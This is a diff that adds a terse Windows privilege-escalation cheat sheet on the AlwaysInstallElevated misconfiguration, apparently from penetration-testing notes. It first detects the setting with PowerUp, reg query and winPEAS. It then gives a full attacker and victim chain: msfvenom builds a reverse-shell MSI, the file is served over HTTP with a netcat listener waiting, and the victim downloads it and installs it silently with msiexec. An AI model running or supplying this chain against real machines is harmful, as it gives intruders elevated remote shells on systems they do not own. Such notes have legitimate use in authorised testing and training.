@@ -1,0 +1,28 @@
+# AlwaysInstallElevated
+# Detection
+powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+[*] Checking for AlwaysInstallElevated registry key...
+AbuseFunction : Write-UserAddMSI
+
+# or If both values are equal to 1 then it's vulnerable.
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+# or
+
+winPEAS.exe
+[+] Checking AlwaysInstallElevated(T1012)
+
+  AlwaysInstallElevated set to 1 in HKLM!
+  AlwaysInstallElevated set to 1 in HKCU!
+
+# Exploitation
+# Attacker
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
+sudo python -m SimpleHTTPServer 80
+sudo nc -lvp <PORT>
+
+# Victim
+powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
+msiexec /quiet /qn /i C:\Temp\program.msi
